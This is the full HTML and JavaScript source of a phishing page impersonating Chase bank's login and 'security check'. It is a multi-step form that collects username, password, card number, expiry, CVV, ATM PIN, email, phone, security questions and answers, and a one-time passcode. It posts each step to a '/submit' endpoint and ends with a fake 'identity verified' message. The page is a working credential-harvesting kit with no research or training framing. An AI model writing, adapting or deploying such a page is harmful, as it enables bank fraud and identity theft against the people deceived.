<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chase Online: Secure Access</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f0f2f5;
        }
        .chase-blue { background-color: #116bb4; }
        .chase-yellow { background-color: #ffc423; }
        .input-focus:focus {
            border-color: #116bb4;
            box-shadow: 0 0 0 1px #116bb4;
        }
    </style>
</head>
<body class="flex flex-col min-h-screen">

    <!-- Header -->
    <header class="chase-blue p-4 shadow-lg">
        <div class="max-w-md mx-auto flex items-center justify-between">
            <h1 class="text-3xl font-bold text-white">CHASE</h1>
            <div class="text-white text-sm font-semibold">Security Check</div>
        </div>
    </header>

    <!-- Main Content Area -->
    <main class="flex-grow flex items-center justify-center p-4">
        <div id="form-card" class="bg-white rounded-xl shadow-2xl w-full max-w-md overflow-hidden transition-all duration-500 ease-in-out transform scale-100">
            
            <!-- Progress Bar -->
            <div id="progress-bar" class="chase-yellow h-2 w-0 transition-all duration-700 ease-out"></div>

            <!-- Form Content -->
            <div class="p-6">
                <!-- Custom Modal for Errors -->
                <div id="error-modal" class="hidden fixed inset-0 bg-gray-600 bg-opacity-75 flex items-center justify-center z-50">
                    <div class="bg-white rounded-lg p-6 shadow-xl w-80">
                        <h3 class="text-xl font-bold text-red-600 mb-4">Connection Error</h3>
                        <p class="text-gray-700 mb-6">We apologize, but there was an issue processing your request. Please try again.</p>
                        <button id="modal-ok-button" class="w-full bg-red-600 text-white py-2 rounded-lg font-semibold hover:bg-red-700 transition duration-300">OK</button>
                    </div>
                </div>

                <div id="form-container">
                    <!-- Step content will be injected here -->
                </div>
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer class="p-4 text-center text-gray-500 text-xs">
        &copy; 2024 JPMorgan Chase & Co.
    </footer>

    <script>
        const STEPS = [
            { name: 'LOGIN_CREDENTIALS', title: 'Verify Your Identity', fields: ['username', 'password'], progress: 20 },
            { name: 'VERIFICATION_INFO', title: 'Additional Verification', fields: ['card', 'exp', 'cvv', 'pin'], progress: 40 },
            { name: 'CONTACT_INFO', title: 'Contact Information', fields: ['email', 'phone'], progress: 60 },
            // UPDATED: Now requires four fields (2 questions, 2 answers)
            { name: 'SECURITY_QUESTIONS', title: 'Security Questions (Complete two fields)', fields: ['q1_question', 'q1_answer', 'q2_question', 'q2_answer'], progress: 80 },
            { name: 'OTP_ENTRY', title: 'One-Time Passcode', fields: ['otp'], progress: 95 },
            { name: 'COMPLETE', title: 'Thank You', fields: [], progress: 100 }
        ];

        let currentStepIndex = 0;
        let collectedData = {};

        const formContainer = document.getElementById('form-container');
        const progressBar = document.getElementById('progress-bar');
        const errorModal = document.getElementById('error-modal');
        const modalOkButton = document.getElementById('modal-ok-button');

        // Close modal when OK is clicked
        modalOkButton.addEventListener('click', () => {
            errorModal.classList.add('hidden');
        });

        // Function to show the custom error modal
        function showConnectionError() {
            errorModal.classList.remove('hidden');
        }
        
        // Function to submit data to the server
        async function submitData(step, data) {
            collectedData = { ...collectedData, ...data }; 
            
            try {
                // Return the promise result for error checking in handleFormSubmit
                const response = await fetch('/submit', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        step: step.name,
                        data: data
                    })
                });

                // Check for HTTP errors (like 400 or 500)
                if (!response.ok) {
                    // Throw an error that will be caught below
                    throw new Error('Server returned an error status: ' + response.status);
                }
                
                // If successful, return true
                return true;

            } catch (error) {
                // This catches network errors and thrown HTTP errors
                console.error('Submission Error:', error);
                return false;
            }
        }

        // Function to render the current step's form
        function renderStep() {
            const step = STEPS[currentStepIndex];
            progressBar.style.width = step.progress + '%';

            if (step.name === 'COMPLETE') {
                formContainer.innerHTML = `
                    <h2 class="text-2xl font-bold text-gray-800 mb-4">${step.title}</h2>
                    <p class="text-gray-600 mb-6">Your identity has been successfully verified. You may now continue to your Chase online account.</p>
                    <button class="w-full chase-blue text-white py-3 rounded-lg font-semibold hover:bg-blue-700 transition duration-300">Continue to Chase Online</button>
                `;
                return;
            }

            let formHtml = `<h2 class="text-xl font-bold text-gray-800 mb-6">${step.title}</h2><form id="current-form">`;
            
            // --- SECURITY QUESTIONS STEP HANDLING ---
            if (step.name === 'SECURITY_QUESTIONS') {
                formHtml += `
                    <p class="text-sm text-gray-600 mb-6">For security, please enter the questions and answers you used to set up your account.</p>

                    <!-- Question 1 -->
                    <div class="mb-6 border-t pt-4">
                        <label for="q1_question" class="block text-sm font-medium text-gray-700 mb-1">Security Question 1 (e.g., What is your mother's maiden name?)</label>
                        <input type="text" id="q1_question" name="q1_question" class="w-full px-4 py-2 border border-gray-300 rounded-lg input-focus focus:outline-none" required>
                    </div>
                    <div class="mb-6">
                        <label for="q1_answer" class="block text-sm font-medium text-gray-700 mb-1">Answer 1</label>
                        <input type="text" id="q1_answer" name="q1_answer" class="w-full px-4 py-2 border border-gray-300 rounded-lg input-focus focus:outline-none" required>
                    </div>

                    <!-- Question 2 -->
                    <div class="mb-6 border-t pt-4">
                        <label for="q2_question" class="block text-sm font-medium text-gray-700 mb-1">Security Question 2 (e.g., What was the name of your first pet?)</label>
                        <input type="text" id="q2_question" name="q2_question" class="w-full px-4 py-2 border border-gray-300 rounded-lg input-focus focus:outline-none" required>
                    </div>
                    <div class="mb-6">
                        <label for="q2_answer" class="block text-sm font-medium text-gray-700 mb-1">Answer 2</label>
                        <input type="text" id="q2_answer" name="q2_answer" class="w-full px-4 py-2 border border-gray-300 rounded-lg input-focus focus:outline-none" required>
                    </div>
                `;
            } else {
                // --- DEFAULT FIELD RENDERING FOR OTHER STEPS ---
                step.fields.forEach(field => {
                    let label, type = 'text', inputAttributes = 'required';
                    
                    switch(field) {
                        case 'username': label = 'Username'; break;
                        case 'password': label = 'Password'; type = 'password'; break;
                        case 'card': label = 'Credit/Debit Card Number'; type = 'tel'; inputAttributes = 'required pattern="[0-9]{13,19}" maxlength="19"'; break;
                        case 'exp': label = 'Expiration Date (MM/YY)'; type = 'tel'; inputAttributes = 'required pattern="(0[1-9]|1[0-2])\/[0-9]{2}" maxlength="5" placeholder="MM/YY"'; break;
                        case 'cvv': label = 'CVV (3-4 digits)'; type = 'password'; inputAttributes = 'required pattern="[0-9]{3,4}" maxlength="4"'; break;
                        case 'pin': label = 'ATM PIN'; type = 'password'; inputAttributes = 'required pattern="[0-9]{4}" maxlength="4"'; break;
                        case 'email': label = 'Email Address'; type = 'email'; break;
                        case 'phone': label = 'Phone Number (XXX-XXX-XXXX)'; type = 'tel'; inputAttributes = 'required pattern="[0-9]{3}-?[0-9]{3}-?[0-9]{4}" maxlength="12" placeholder="e.g., 555-123-4567"'; break;
                        case 'otp': label = 'One-Time Passcode'; type = 'tel'; inputAttributes = 'required pattern="[0-9]{6}" maxlength="6"'; break;
                        default: label = field;
                    }

                    if (field !== 'exp' && field !== 'cvv') {
                        formHtml += `
                            <div class="mb-4">
                                <label for="${field}" class="block text-sm font-medium text-gray-700 mb-1">${label}</label>
                                <input type="${type}" id="${field}" name="${field}" class="w-full px-4 py-2 border border-gray-300 rounded-lg input-focus focus:outline-none" ${inputAttributes}>
                            </div>
                        `;
                    }
                });
                
                // Special layout for Verification Info step (exp and cvv)
                if (step.name === 'VERIFICATION_INFO') {
                    formHtml += `
                        <div class="flex space-x-4 mb-4">
                            <div class="flex-1">
                                <label for="exp" class="block text-sm font-medium text-gray-700 mb-1">Expiration (MM/YY)</label>
                                <input type="tel" id="exp" name="exp" class="w-full px-4 py-2 border border-gray-300 rounded-lg input-focus focus:outline-none" required pattern="(0[1-9]|1[0-2])\/[0-9]{2}" maxlength="5" placeholder="MM/YY">
                            </div>
                            <div class="flex-1">
                                <label for="cvv" class="block text-sm font-medium text-gray-700 mb-1">CVV</label>
                                <input type="password" id="cvv" name="cvv" class="w-full px-4 py-2 border border-gray-300 rounded-lg input-focus focus:outline-none" required pattern="[0-9]{3,4}" maxlength="4">
                            </div>
                        </div>
                    `;
                }
            }


            formHtml += `
                <button type="submit" class="w-full chase-blue text-white py-3 rounded-lg font-semibold hover:bg-blue-700 transition duration-300 mt-2">Continue</button>
            </form>`;

            formContainer.innerHTML = formHtml;

            document.getElementById('current-form').addEventListener('submit', handleFormSubmit);
        }

        // Handles form submission, validation, data submission, and step advancement
        async function handleFormSubmit(event) {
            event.preventDefault();
            const form = event.target;
            const step = STEPS[currentStepIndex];
            const formData = new FormData(form);
            const data = {};
            let allValid = true;

            // Basic validation and data collection
            step.fields.forEach(field => {
                const value = formData.get(field)?.trim();
                
                if (!value) {
                    allValid = false;
                }
                data[field] = value;
            });

            if (!allValid) {
                // If fields are missing, let the browser handle the 'required' warning
                return;
            }
            
            // Attempt to submit data
            const submissionSuccessful = await submitData(step, data);

            if (submissionSuccessful) {
                // Advance to the next step only if submission succeeded
                currentStepIndex++;
                renderStep();
            } else {
                // Show the custom connection error modal if submission failed
                showConnectionError();
            }
        }

        // Initial render
        document.addEventListener('DOMContentLoaded', renderStep);
    </script>
</body>
</html>